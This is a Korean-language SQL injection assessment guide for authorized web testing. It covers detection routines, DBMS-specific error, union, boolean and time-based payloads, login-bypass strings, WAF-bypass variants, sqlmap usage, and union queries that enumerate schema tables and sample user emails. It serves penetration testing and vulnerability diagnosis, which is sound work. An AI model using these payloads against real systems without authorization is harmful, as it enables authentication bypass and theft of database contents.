---
sidebar_position: 20
title: SQL Injection
description: 웹 진단 - SQL Injection 컨텍스트 판단, 응답 비교, 페이로드, 우회 노트
keywords: [SQL Injection, SQLi, Error-based, Boolean, Time-based, Union-based, CASE WHEN, BETWEEN, MySQL, PostgreSQL, MSSQL, Oracle, SQLite, 입력값 검증, OWASP A05]
draft: false
toc_max_heading_level: 3
---

## 점검 목적

사용자 입력값이 SQL Query에 안전하게 바인딩되지 않은 채 들어가 쿼리 구조를 변경할 수 있는지 확인. 성공 시 인증 우회, 권한 없는 데이터 조회, 데이터 변조, 내부 정보 노출이 가능함. 운영 환경에서는 가용성 이슈를 피하기 위해 지연 payload와 대량 조회를 최소 범위로 제한.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **Error-based** | DB 오류 메시지가 응답에 노출 | DBMS, 쿼리 일부, 컬럼명, 함수명 노출 여부 확인 |
| **Union-based** | `UNION SELECT` 결과가 화면/API 응답에 섞여 나옴 | 컬럼 수, 출력 위치, 데이터 타입이 맞아야 함 |
| **Boolean-based Blind** | True/False 조건에 따라 응답 내용이 달라짐 | status보다 row 수, 메시지, JSON 값, 응답 길이 차이를 봄 |
| **Time-based Blind** | 조건이 참일 때 응답 시간이 지연됨 | baseline 대비 반복적으로 지연되는지 확인 |
| **Second-Order** | 저장된 값이 다른 화면/배치/관리자 기능에서 쿼리에 사용됨 | 입력 화면이 아니라 조회/처리 시점까지 따라가야 함 |
| **OOB** | DNS/HTTP 같은 외부 요청으로 확인 | 운영 진단에서는 사전 협의 없으면 사용하지 않음 |

---

## 진단 절차

#### Step 1. 진입점 식별

DB 조회 조건, 정렬 조건, 저장 후 재조회되는 값부터 우선 본다.

- URL 파라미터: `?id=1`, `?seq=100`, `?category=notice`
- 검색/필터: `q`, `keyword`, `searchText`, `startDate`, `endDate`
- 정렬/페이징: `sort`, `order`, `orderBy`, `page`, `limit`, `offset`
- 로그인/인증: `id`, `userId`, `loginId`, `password`, `pw`
- JSON body: `{ "id": 1 }`, `{ "keyword": "test" }`
- Cookie/Header: `lang`, `tenant`, `X-Forwarded-For`, `User-Agent`
- 저장값: 회원명, 부서명, 게시글 제목, 파일명, 관리자 메모

#### Step 2. SQLi 진단 루틴

Burp Repeater에서 baseline을 먼저 고정한 뒤, **오류 유발 → True/False 비교 → 지연 비교 → 컨텍스트 전환** 순서로 좁힌다.

**1. 오류 유발**

```text
'
"
\
`
)
'))
';
```

**2. Boolean 비교**

```text
' AND '1'='1
' AND '1'='2
' OR '1'='1
' OR '1'='2
```

숫자형처럼 보이는 파라미터는 quote 없이도 같이 본다.

```text
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 OR 1=2
```

**3. Time 비교**

```sql
' AND SLEEP(3)-- -
' AND pg_sleep(3)-- -
'; WAITFOR DELAY '0:0:3'-- -
```

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| DB 오류 메시지 노출 | Error-based 후보 | DBMS 문자열, 컬럼/테이블명, SQL syntax 위치 확인 |
| `1=1`은 정상, `1=2`는 빈 목록 | Boolean-based 가능성 높음 | 응답 길이, row 수, `totalCount`, 메시지를 비교 |
| status는 같고 JSON 값만 다름 | API Blind 후보 | 바뀌는 필드만 고정해서 반복 확인 |
| `SLEEP(3)`에서만 3초 이상 지연 | Time-based 후보 | 같은 요청을 3회 반복해 baseline 편차와 분리 |
| 특수문자만 500, 논리식 차이 없음 | 단순 예외 가능성 | DB 오류 signature 또는 다른 컨텍스트로 재시도 |
| WAF/필터 응답으로 차단 | 입력 전처리 또는 WAF | 인코딩, 주석, 대소문자, 연산자 우회 확인 |
| 파라미터가 서버 응답에 영향 없음 | 미사용 파라미터 가능성 | 실제 요청 body, hidden parameter, 다른 API 확인 |

#### Step 3. 컨텍스트별 빠른 선택

먼저 파라미터가 SQL에서 어떤 자리에 들어갈지 가정하고 payload를 고른다.

| 입력 컨텍스트 | 먼저 넣을 payload | 볼 것 |
| :--- | :--- | :--- |
| 숫자형 조건: `id=1` | `1 AND 1=1`, `1 AND 1=2` | 상세 데이터 존재/미존재, 권한 오류와 구분 |
| 문자열 조건: `name=test` | `test' AND '1'='1`, `test' AND '1'='2` | 검색 결과 수, 빈 목록, DB 오류 |
| 검색/LIKE: `q=test` | `test%' AND '1'='1`, `test%' AND '1'='2` | wildcard 반영, 전체/부분 검색 결과 차이 |
| 로그인 ID | `admin'-- -`, `admin' OR '1'='1'-- -` | 뒤의 password 조건이 주석 처리되는지 |
| 로그인 PW | `test' OR '1'='1`, `test') OR ('1'='1` | ID 고정 상태에서 인증 성공 여부 |
| 정렬: `sort=name` | `sort=name desc`, `sort=1` | 서버 정렬 반영, SQL 오류, allowlist 여부 |
| 페이징: `limit=10` | `limit=1`, `limit=10 OFFSET 0` | row 수 변화, 문법 오류 |
| JSON 값 | `{"id":"1 AND 1=1"}`, `{"id":1}` | 문자열/숫자 타입 강제 여부 |
| Cookie/Header | `'`, `')`, `' AND '1'='1` | 즉시 응답보다 로그/관리자 화면 영향 |

#### Step 4. DBMS 식별

오류 메시지, 함수명, 지연 함수 반응으로 DBMS를 좁힌다.

| DBMS | 식별·현재 DB | 문자열 조건 함수 | 지연 확인 |
| :--- | :--- | :--- | :--- |
| MySQL/MariaDB | `VERSION()`, `DATABASE()` | `SUBSTRING()`, `ASCII()`, `CHAR_LENGTH()` | `SLEEP(3)` |
| PostgreSQL | `VERSION()`, `CURRENT_DATABASE()` | `SUBSTRING()`, `ASCII()`, `LENGTH()` | `pg_sleep(3)` |
| MSSQL | `@@VERSION`, `DB_NAME()` | `SUBSTRING()`, `ASCII()`/`UNICODE()`, `LEN()` | `WAITFOR DELAY '0:0:3'` 문장 |
| Oracle | `banner FROM v$version`, `SYS_CONTEXT('USERENV','DB_NAME')` | `SUBSTR()`, `ASCII()`, `LENGTH()` | 패키지 실행 권한과 SQL/PLSQL 문맥에 따라 다름 |
| SQLite | `SQLITE_VERSION()` | `SUBSTR()`, `UNICODE()`, `LENGTH()` | 기본 내장 sleep 함수 없음 |

`CASE WHEN ... THEN ... ELSE ... END`와 `BETWEEN ... AND ...`은 위 DBMS에서 공통으로 쓸 수 있지만, 현재 DB명과 문자열 처리 함수는 다르다. MSSQL의 `WAITFOR`와 Oracle의 `DBMS_LOCK.SLEEP`은 값(expression)이 아니라 문장 또는 프로시저이므로 `CASE`의 `THEN` 반환값 자리에 그대로 넣지 않는다.

#### Step 5. 영향 확인

취약 확정에는 “대량 추출”보다 **최소 증거**가 좋다.

- Boolean: 같은 요청에서 True/False 조건만 바꿨을 때 응답이 안정적으로 갈리는지 확인
- Error: 오류 메시지에 DBMS/쿼리/컬럼 정보가 노출되는지 확인
- Union: 임의 상수값이 화면이나 JSON 응답에 출력되는지 확인
- Time: baseline 대비 지연이 반복적으로 재현되는지 확인
- 인증 우회: 정상 비밀번호 없이 특정 계정 세션이 발급되는지 확인
- Stored/Second-Order: 저장한 값이 다른 기능에서 SQL 오류나 조건 변화로 이어지는지 확인

---

## 페이로드 노트

아래 payload는 컨텍스트가 어느 정도 잡혔을 때 사용한다. 운영 환경에서는 지연 시간은 짧게, 반복 횟수는 필요한 만큼만 잡는다.

### 1. 숫자형 / 문자열 조건

숫자형 파라미터는 quote 없는 payload를 먼저 본다.

```sql
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 OR 1=2
1 AND 2>1
1 AND 2<1
```

문자열 파라미터는 quote를 닫고 조건식을 붙인다.

```sql
test' AND '1'='1
test' AND '1'='2
test' OR '1'='1
test' OR '1'='2
test') AND ('1'='1
test') AND ('1'='2
```

응답이 빈 목록으로 바뀌는지, `totalCount`, `pageInfo`, `message`, `data.length`가 달라지는지 본다.

### 2. 검색 / LIKE 컨텍스트

검색어는 보통 `LIKE '%<INPUT>%'` 형태라 wildcard와 quote 위치가 중요하다.

```sql
test%' AND '1'='1
test%' AND '1'='2
%' AND '1'='1
%' AND '1'='2
test%' OR '1'='1
```

검색 결과가 너무 많아지면 오탐처럼 보일 수 있다. baseline 검색어를 고정하고 조건식만 바꿔 비교한다.

### 3. 정렬 / ORDER BY 컨텍스트

`sort`, `order`, `orderBy`는 보통 `ORDER BY <INPUT>` 자리에 들어간다. quote payload보다 먼저 **서버 정렬이 실제로 바뀌는지**와 **SQL expression이 실행되는지**를 본다.

| 단계 | 요청 값 | 확인 의도 | 판단 |
| :--- | :--- | :--- | :--- |
| 기본 정렬 | `sort=name` | 파라미터가 정렬에 쓰이는지 확인 | 이름순으로 바뀌면 서버 정렬 가능성 |
| 역방향 정렬 | `sort=name desc` | 정렬 방향이 그대로 반영되는지 확인 | 역순 정렬되면 입력값이 `ORDER BY`에 가까움 |
| 컬럼 순번 | `sort=1`, `sort=1 desc` | `ORDER BY 1` 형태 허용 여부 확인 | 정렬 변화 또는 SQL 오류 확인 |
| 조건식 | `sort=case when 1=1 then name else id end` | SQL expression 실행 여부 확인 | `name` 기준 정렬 |
| 조건식 반전 | `sort=case when 1=2 then name else id end` | True/False에 따른 정렬 차이 확인 | `id` 기준 정렬 |

`name`, `id`는 예시다. 실제 화면에 있는 `title`, `seq`, `createdAt` 같은 정렬 가능 컬럼으로 바꿔서 본다. 프론트 정렬, 서버 allowlist 정렬, DB 정렬을 구분하려면 같은 요청을 Raw response 기준으로 비교한다.

### 4. JSON Body 컨텍스트

JSON은 먼저 서버가 타입을 강제하는지 본다. 숫자 필드가 문자열도 받으면 SQL 조건식이 문자열로 전달될 여지가 있다.

```json
{"id":1}
{"id":"1"}
{"id":"1 AND 1=1"}
{"id":"1 AND 1=2"}
```

검색 API처럼 문자열 필드가 SQL 조건에 들어가는 경우에는 일반 문자열 조건과 동일하게 본다.

```json
{"keyword":"test' AND '1'='1"}
{"keyword":"test' AND '1'='2"}
```

JSON 파싱 단계에서 막히는 오류와 DB Query 단계에서 나는 오류를 구분한다. `400 Bad Request`만 나오면 SQLi보다 타입/스키마 검증에 걸렸을 가능성이 높다.

### 5. 로그인 우회

로그인은 어느 파라미터 뒤에 `AND password = ...`가 붙는지 먼저 가정한다.

```sql
admin'-- -
admin' #
admin'/*
admin' OR '1'='1'-- -
' OR '1'='1'-- -
```

앞쪽 ID 파라미터가 실패하면 뒤쪽 password 파라미터를 본다.

```http
POST /api/login HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

id=admin&pw=test' OR '1'='1
```

공백, `=`, quote가 필터링되거나 form encoding에서 깨지면 URL 인코딩으로 재시도한다.

```text
id=admin&pw=test'+OR+'1'%3d'1
id=admin&pw=test%27%20OR%20%271%27%3d%271
```

판정은 “로그인 성공”만 보지 말고 세션 발급, 사용자 식별값, 권한 화면 접근까지 확인한다.

### 6. Error-based

오류가 응답에 노출될 때만 사용한다. DBMS가 다르면 함수가 바로 달라진다.

```sql
-- MySQL/MariaDB
' AND extractvalue(1, concat(0x7e, version()))-- -
' AND updatexml(1, concat(0x7e, database()), 1)-- -

-- PostgreSQL
' AND CAST(version() AS int)-- -
' AND CAST(current_database() AS int)-- -

-- MSSQL
' AND 1=CONVERT(int, @@version)-- -

-- Oracle
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -
```

오류 메시지가 화면에 그대로 나오면 취약 확정에 가깝다. 운영에서는 오류 기반으로 DB명/버전 정도만 확인하고 멈추는 편이 안전하다.

### 7. Union-based

화면이나 API 응답에 쿼리 결과가 출력될 때만 유효하다.

```sql
-- 컬럼 수 확인
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- 출력 위치 확인
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -

-- 최소 정보 확인
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,user(),3-- -
```

컬럼 수가 맞아도 데이터 타입이 안 맞으면 실패한다. 숫자/문자/날짜 컬럼이 섞인 화면에서는 `NULL`로 맞춘 뒤 출력 위치에만 문자열을 넣는다.

### 8. Boolean-based Blind

응답 내용이 달라지는 필드를 먼저 정한다.

```sql
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))>100-- -
' AND LENGTH(database())>5-- -
```

API에서는 아래 항목을 비교한다.

```text
HTTP status
Content-Length
data 배열 개수
totalCount / count
success / resultCode
message
redirect 여부
```

캐시가 섞이면 같은 payload를 반복해도 응답이 흔들린다. `Cache-Control: no-cache`를 붙이거나 의미 없는 파라미터를 추가해 baseline을 다시 잡는다.

### 9. `CASE WHEN ... THEN` 조건 분기

`CASE`는 별도의 SQL Injection 유형이 아니라 **조건에 따라 하나의 값을 반환하는 식(expression)** 이다. 일반 `AND 1=1` 비교가 응답에 잘 드러나지 않거나, 입력값이 `ORDER BY` 같은 식 자리에 들어갈 때 True/False 차이를 만들기 좋다.

```sql
-- searched CASE: Injection에서 주로 쓰는 형태
CASE WHEN <조건> THEN <참일 때 값> ELSE <거짓일 때 값> END

-- simple CASE: 한 값을 여러 후보와 비교할 때 사용
CASE <값> WHEN <비교값> THEN <결과> ELSE <기본값> END
```

`CASE` 자체는 Boolean 조건이 아니므로, 숫자 `1`/`0` 또는 문자열 `A`/`B`를 반환한 뒤 바깥에서 다시 비교한다.

#### 응답 기반 True/False

**이럴 때 사용**: `WHERE`, `HAVING`, scalar subquery처럼 식을 받을 수 있고, 참일 때 row가 남고 거짓일 때 사라지는 지점.

**바꿀 값**: `1=1`과 `1=2`만 바꿔 나머지 요청을 동일하게 유지한다.

```sql
' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1-- -
' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=1-- -
```

문자형 결과가 더 자연스러운 문맥에서는 `THEN`과 `ELSE`를 같은 문자열 타입으로 맞춘다.

```sql
' AND CASE WHEN (1=1) THEN 'A' ELSE 'B' END='A'-- -
' AND CASE WHEN (1=2) THEN 'A' ELSE 'B' END='A'-- -
```

**확인할 것**: HTTP status만 보지 말고 row 수, `totalCount`, 특정 JSON 필드, 메시지, redirect가 두 요청 사이에서 안정적으로 갈리는지 본다.

#### `ORDER BY CASE`

`sort`, `orderBy`처럼 정렬 식만 주입할 수 있을 때는 오류나 본문 제거 대신 **정렬 순서**를 True/False 신호로 쓸 수 있다.

```sql
CASE WHEN (1=1) THEN name ELSE created_at END
CASE WHEN (1=2) THEN name ELSE created_at END
```

요청 파라미터 예시는 다음과 같다.

```text
sort=CASE WHEN (1=1) THEN name ELSE created_at END
sort=CASE WHEN (1=2) THEN name ELSE created_at END
```

`name`, `created_at`은 실제 Query에 존재하는 컬럼으로 바꾼다. 두 컬럼의 데이터 타입이 다르면 DBMS가 암시적 형 변환을 시도하다 오류가 날 수 있으므로, 처음에는 같은 문자형 또는 같은 숫자형 컬럼 두 개를 고른다. 정렬 차이가 눈에 보이도록 값 분포가 다른 컬럼을 선택한다.

#### DBMS별 조건식

아래 예시는 현재 DB명 첫 글자의 문자 코드가 `77`보다 큰지를 확인한다. DB 식별 전에는 함수명을 섞지 말고, Step 4에서 반응한 DBMS의 문법만 사용한다.

```sql
-- MySQL/MariaDB
' AND CASE WHEN ASCII(SUBSTRING(DATABASE(),1,1))>77 THEN 1 ELSE 0 END=1-- -

-- PostgreSQL
' AND CASE WHEN ASCII(SUBSTRING(CURRENT_DATABASE(),1,1))>77 THEN 1 ELSE 0 END=1-- -

-- MSSQL
' AND CASE WHEN ASCII(SUBSTRING(DB_NAME(),1,1))>77 THEN 1 ELSE 0 END=1-- -

-- Oracle
' AND CASE WHEN ASCII(SUBSTR(SYS_CONTEXT('USERENV','DB_NAME'),1,1))>77 THEN 1 ELSE 0 END=1-- -

-- SQLite: DB 파일명 대신 내장 버전 문자열로 문법 반응 확인
' AND CASE WHEN UNICODE(SUBSTR(SQLITE_VERSION(),1,1))>51 THEN 1 ELSE 0 END=1-- -
```

| DBMS | 조건 대상 예시 | 위치 추출 | 문자 코드 | 조건부 지연에서의 차이 |
| :--- | :--- | :--- | :--- | :--- |
| MySQL/MariaDB | `DATABASE()` | `SUBSTRING(value,pos,1)` | `ASCII()` | `SLEEP()`이 값을 반환하므로 `CASE` 결과 식에 배치 가능 |
| PostgreSQL | `CURRENT_DATABASE()` | `SUBSTRING(value,pos,1)` | `ASCII()` | `pg_sleep()`은 `void`를 반환하므로 보통 별도 `SELECT CASE` 문맥 사용 |
| MSSQL | `DB_NAME()` | `SUBSTRING(value,pos,1)` | `ASCII()`/`UNICODE()` | `WAITFOR`는 문장이므로 `CASE THEN`에 넣지 않고 stacked `IF` 사용 |
| Oracle | `SYS_CONTEXT('USERENV','DB_NAME')` | `SUBSTR(value,pos,1)` | `ASCII()` | `DBMS_LOCK.SLEEP`은 프로시저이므로 단순 SQL `CASE` 반환값으로 사용 불가 |
| SQLite | `SQLITE_VERSION()` 또는 scalar subquery | `SUBSTR(value,pos,1)` | `UNICODE()` | 기본 내장 지연 함수가 없어 응답·정렬 차이를 우선 사용 |

MySQL/MariaDB는 식 안에서 조건부 지연을 만들 수 있다. 먼저 3초 이하의 짧은 값으로 시작하고, True/False 쌍을 반복 비교한다.

```sql
' AND CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END=0-- -
' AND CASE WHEN (1=2) THEN SLEEP(3) ELSE 0 END=0-- -
```

PostgreSQL과 MSSQL은 같은 의도를 아래처럼 표현하지만, 둘 다 **stacked query가 허용되는 문맥**이어야 한다.

```sql
-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
'; SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -

-- MSSQL: WAITFOR는 CASE 식이 아니라 IF 뒤의 문장
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -
'; IF (1=2) WAITFOR DELAY '0:0:3'-- -
```

#### 실패 원인

- `THEN`과 `ELSE`의 결과 타입이 호환되지 않으면 조건이 맞아도 형 변환 오류가 날 수 있음
- `ELSE`를 생략하면 어느 `WHEN`도 참이 아닐 때 `NULL`을 반환해 False 응답과 구분하기 어려움
- `CASE`는 보통 필요한 분기만 평가하지만, 상수식·집계식·암시적 형 변환이 Query 최적화 단계에서 먼저 평가될 수 있음
- 따라서 `CASE WHEN <조건> THEN 1/0 ELSE 1 END` 같은 오류 유발식은 조건부 실행을 보장하는 기준 payload로 쓰지 않음
- `CASE`가 파싱된다는 사실만으로 취약이 확정되지는 않음. 같은 요청에서 True/False 응답 차이까지 재현해야 함

### 10. `BETWEEN` 범위 조건

`BETWEEN`은 값이 범위 안에 있는지 확인하는 조건식이다. 양 끝값을 모두 포함하며, 기본 의미는 `<값> >= <하한> AND <값> <= <상한>`과 같다.

```sql
-- True
' AND 1 BETWEEN 1 AND 1-- -

-- False
' AND 1 BETWEEN 2 AND 3-- -
```

`=` 필터링을 피하면서 같은 값인지 확인하거나, Blind SQL Injection에서 문자 코드 후보 범위를 절반씩 줄일 때 유용하다. 다만 문법 자체에 `AND`가 필요하므로 `AND` 키워드가 차단된 상황의 우회는 아니다.

#### 최소 진단 쌍

숫자형은 하한과 상한만 바꿔 비교한다.

```sql
1 AND 7 BETWEEN 7 AND 7
1 AND 7 BETWEEN 8 AND 9
```

문자열 비교는 DB collation 영향을 받으므로 취약 여부를 처음 확인할 때만 단순 문자를 쓰고, 실제 범위 추론은 `ASCII()` 또는 `UNICODE()`로 숫자화한다.

```sql
' AND 'm' BETWEEN 'a' AND 'z'-- -
' AND 'm' BETWEEN 'n' AND 'z'-- -
```

#### 범위 분할 추론

Blind 추론은 한 글자씩 모든 값을 대입하기보다 범위를 반으로 나누면 요청 수를 줄일 수 있다. 출력 가능한 ASCII 범위를 `32~126`으로 가정하면 한 위치를 최대 7번 정도 비교해 좁힐 수 있다.

```text
1. 전체 후보: 32~126
2. 32~79가 True인지 확인
3. True면 32~55, False면 80~103처럼 현재 후보 범위를 다시 분할
4. 마지막 한 값은 BETWEEN <값> AND <값>으로 확정
```

먼저 길이 범위를 확인한 뒤, 각 위치의 문자 코드 범위를 줄인다.

```sql
-- 길이가 1~32인지
' AND <길이_식> BETWEEN 1 AND 32-- -

-- 첫 글자가 출력 가능한 ASCII 범위인지
' AND <문자코드_식> BETWEEN 32 AND 126-- -

-- 첫 글자 후보를 절반으로 분할
' AND <문자코드_식> BETWEEN 32 AND 79-- -
```

#### DBMS별 길이·문자 범위

```sql
-- MySQL/MariaDB
' AND CHAR_LENGTH(DATABASE()) BETWEEN 1 AND 32-- -
' AND ASCII(SUBSTRING(DATABASE(),1,1)) BETWEEN 65 AND 77-- -

-- PostgreSQL
' AND LENGTH(CURRENT_DATABASE()) BETWEEN 1 AND 32-- -
' AND ASCII(SUBSTRING(CURRENT_DATABASE(),1,1)) BETWEEN 65 AND 77-- -

-- MSSQL
' AND LEN(DB_NAME()) BETWEEN 1 AND 32-- -
' AND ASCII(SUBSTRING(DB_NAME(),1,1)) BETWEEN 65 AND 77-- -

-- Oracle
' AND LENGTH(SYS_CONTEXT('USERENV','DB_NAME')) BETWEEN 1 AND 32-- -
' AND ASCII(SUBSTR(SYS_CONTEXT('USERENV','DB_NAME'),1,1)) BETWEEN 65 AND 77-- -

-- SQLite: DB 파일명 조회용 표준 함수가 없어 버전 문자열로 문법 확인
' AND LENGTH(SQLITE_VERSION()) BETWEEN 1 AND 32-- -
' AND UNICODE(SUBSTR(SQLITE_VERSION(),1,1)) BETWEEN 48 AND 57-- -
```

SQLite에서 실제 값 범위를 확인할 때는 `SQLITE_VERSION()`을 대상 scalar subquery로 바꾼다. 예를 들어 허용된 범위 내 테스트 테이블의 단일 값 또는 row count처럼 영향이 낮은 대상을 사용한다.

#### `CASE`와 결합

입력 위치가 Boolean 조건을 직접 받지 않고 숫자 결과만 받는다면 `BETWEEN` 결과를 `CASE`로 `1`/`0`에 매핑한다.

```sql
-- MSSQL 예시: 현재 DB명 첫 글자가 A~M 범위인지
' AND CASE
    WHEN ASCII(SUBSTRING(DB_NAME(),1,1)) BETWEEN 65 AND 77 THEN 1
    ELSE 0
  END=1-- -
```

같은 방식으로 DBMS별 `DATABASE()`, `CURRENT_DATABASE()`, `SYS_CONTEXT()`, `SQLITE_VERSION()` 표현식만 바꾼다.

#### 실패 원인

- 하한과 상한을 뒤집으면 일반 `BETWEEN`은 False가 됨. PostgreSQL의 `BETWEEN SYMMETRIC`은 DBMS 식별이 끝난 뒤에만 사용
- 대상 값이나 경계값이 `NULL`이면 결과가 True/False가 아니라 Unknown이 될 수 있음
- 문자열 `BETWEEN`은 대소문자, 언어, accent를 처리하는 collation에 따라 결과가 달라질 수 있으므로 문자 코드 비교를 우선함
- MySQL/MariaDB는 숫자와 문자열을 섞으면 암시적 형 변환이 개입할 수 있으므로 세 값을 같은 타입으로 맞춤
- MSSQL에서 Unicode 문자 범위를 볼 때는 `ASCII()` 대신 `UNICODE()`를 사용함
- 날짜·시간 필터에서는 상한도 포함된다. `2026-07-16 00:00:00`을 상한으로 넣으면 그날의 나머지 시간이 제외될 수 있으므로 baseline 날짜 타입을 먼저 확인함

### 11. Time-based Blind

내용 차이가 없을 때 마지막에 본다. 지연은 짧게 시작하고 baseline 편차가 크면 판단하지 않는다.

```sql
-- MySQL/MariaDB
' AND IF(1=1, SLEEP(3), 0)-- -
' AND IF(1=2, SLEEP(3), 0)-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
'; SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -
'; IF (1=2) WAITFOR DELAY '0:0:3'-- -
```

판정은 한 번의 지연이 아니라 **True 지연 / False 비지연 / baseline 정상** 조합이 반복될 때 한다.

### 12. Second-Order / 저장값

저장 요청에서 아무 반응이 없어도, 저장값이 다른 기능의 SQL 조건으로 재사용될 수 있다.

```http
POST /api/profile/update HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"department":"sales'","nickname":"test"}
```

확인은 저장 직후가 아니라 조회/검색/관리자/엑셀 다운로드/배치 처리 경로까지 본다.

```http
GET /api/admin/users?department=sales HTTP/1.1
Host: <TARGET>

GET /api/users/export?format=xlsx HTTP/1.1
Host: <TARGET>
```

---

## 우회 매트릭스

무작정 payload를 늘리지 말고, 차단되는 문자와 변형되는 위치를 먼저 본다.

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| 공백 차단 | 주석, tab, newline | `/**/OR/**/1=1`, `%09OR%091=1`, `%0aOR%0a1=1` |
| quote 차단 | 숫자형 조건, hex, 함수 | `1 AND 1=1`, `0x61646d696e` |
| `AND` / `OR` 차단 | 연산자 대체, 대소문자 | `&&`, `OR` 연산자 대체, `AnD`, `oR` |
| `UNION` / `SELECT` 차단 | 주석 삽입, 대소문자 | `UN/**/ION SEL/**/ECT`, `UnIoN SeLeCt` |
| `=` 차단 | `LIKE`, `IN`, `BETWEEN`, 비교 연산 | `'a' LIKE 'a'`, `1 IN (1)`, `1 BETWEEN 1 AND 1`, `2>1` |
| `--` 차단 | 다른 주석, 괄호 닫기 | `#`, `/*`, `') OR ('1'='1` |
| URL decoding 이슈 | 한 번/두 번 인코딩 비교 | `%27`, `%2527`, `%20`, `+` |
| JSON 타입 검증 | 문자열/숫자 타입 전환 | `"id":"1 OR 1=1"`, `"id":1` |

### 우회 payload 예시

```sql
'/**/OR/**/'1'='1
'%09OR%09'1'='1
'%0aOR%0a'1'='1
' OR 'a' LIKE 'a
' OR 1 IN (1)
' OR 2>1
1 AND (SELECT 1)=1
1 AND 0x61=0x61
```

---

## sqlmap 참고

실무 운영 점검에서는 고객사 가용성 문제와 점검자가 세부 동작을 통제하기 어려운 이슈 때문에 sqlmap을 기본 사용하지 않는다. 이 문서에서는 랩 환경이나 사전 승인된 제한 검증에서 참고하는 정도로만 둔다.

사용하더라도 Burp 요청 파일 기준으로 대상 파라미터와 기법을 좁힌다.

```bash
sqlmap -r request.txt -p id --batch --technique=BE --current-db
sqlmap -r request.txt -p keyword --batch --technique=B --string="검색 결과"
sqlmap -r request.txt -p id --batch --technique=T --time-sec=3
```

아래 옵션은 운영 환경에서는 특히 주의한다.

```bash
--risk=3
--level=5
--dump
--os-shell
--threads
```

자동화 결과는 최종 판정 근거가 아니라 수동 재현을 돕는 참고 자료로만 본다.

---

## 취약 판정 기준

다음 중 하나라도 안정적으로 재현되면 취약으로 본다.

- [ ] 입력값으로 SQL syntax 오류 또는 DBMS 오류 메시지를 유발할 수 있음
- [ ] True/False 조건만 바꿨을 때 응답 내용, row 수, JSON 필드, redirect가 명확히 달라짐
- [ ] 지연 조건이 참일 때만 baseline 대비 일정 시간 이상 늦어짐
- [ ] `UNION SELECT`로 임의 상수값이나 최소 DB 정보가 응답에 출력됨
- [ ] 로그인 우회로 정상 비밀번호 없이 세션이 발급됨
- [ ] 저장된 payload가 다른 기능에서 SQL 오류나 조건 변화를 유발함

다음은 후보 또는 보류로 둔다.

- [ ] 특수문자 하나로만 500 오류가 나고 논리식 차이가 없음
- [ ] 응답 차이가 캐시, 권한, rate limit, A/B 테스트와 구분되지 않음
- [ ] 파라미터가 서버 쿼리에 쓰이는지 확인되지 않음
- [ ] Time-based 지연이 네트워크 편차와 구분되지 않음

영향도가 올라가는 조건:

- [ ] 인증 우회 또는 타 사용자 데이터 접근 가능
- [ ] 관리자/운영자 기능에서 재현 가능
- [ ] 검색/목록 API에서 권한 없는 테이블성 데이터가 노출됨
- [ ] Second-Order로 저장값이 관리자 기능, 다운로드, 배치에서 실행됨

---

## 블라인드 모의해킹 확장

취약점 진단에서는 오류, Boolean, Time, Union 상수 출력처럼 최소 PoC로 멈추지만, 블라인드 모의해킹에서는 **DB 권한과 실제 접근 가능 데이터 범위**를 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. DB 컨텍스트 | 현재 DB명, DB 사용자, DBMS 종류 | `database()`, `user()`, 버전 일부 |
| 2. 권한 범위 | 접근 가능한 스키마/테이블 목록 | 테이블명 3~5개, 전체 count |
| 3. 민감 데이터 접근 | 사용자/주문/권한/토큰 테이블 조회 가능 여부 | 원문/해시/토큰 샘플, row count |
| 4. 권한 확장 | 쓰기, 파일 접근, DB 계정 권한, OS 연계 가능성 | 테스트 변경 또는 영향 낮은 증거 |

### DB 컨텍스트 확인

Union 출력이 가능한 경우에는 현재 DB와 계정 정도만 먼저 확인한다.

```sql
' UNION SELECT NULL,database(),user()-- -
' UNION SELECT NULL,version(),NULL-- -
```

Blind만 가능한 경우에는 길이/존재 여부 위주로 본다.

```sql
' AND LENGTH(database())>0-- -
' AND ASCII(SUBSTRING(database(),1,1))>64-- -
```

### 스키마 / 테이블 범위 확인

MySQL/MariaDB 기준 예시다. DBMS가 다르면 catalog 뷰를 바꿔서 같은 의도로 확인한다.

```sql
' UNION SELECT NULL,table_name,NULL
  FROM information_schema.tables
  WHERE table_schema=database()
  LIMIT 5-- -
```

컬럼 확인은 민감 테이블이 의심될 때만 제한적으로 본다.

```sql
' UNION SELECT NULL,column_name,NULL
  FROM information_schema.columns
  WHERE table_name='users'
  LIMIT 5-- -
```

### 데이터 샘플 확인

데이터 접근 가능성은 제한된 샘플로 입증한다. 먼저 row count, 컬럼 존재, 테스트 계정 또는 마스킹 가능한 식별값처럼 영향이 낮은 증거를 우선한다.

```sql
' UNION SELECT NULL,CONCAT(id,':',email),NULL
  FROM users
  WHERE id=<TEST_USER_ID>
  LIMIT 1-- -
```

민감 컬럼 접근 가능성은 원문 덤프보다 컬럼 존재와 길이·마스킹 샘플로 확인한다.

```sql
' UNION SELECT NULL,CONCAT(id,':',LEFT(email,3),'***'),NULL
  FROM users
  LIMIT 3-- -

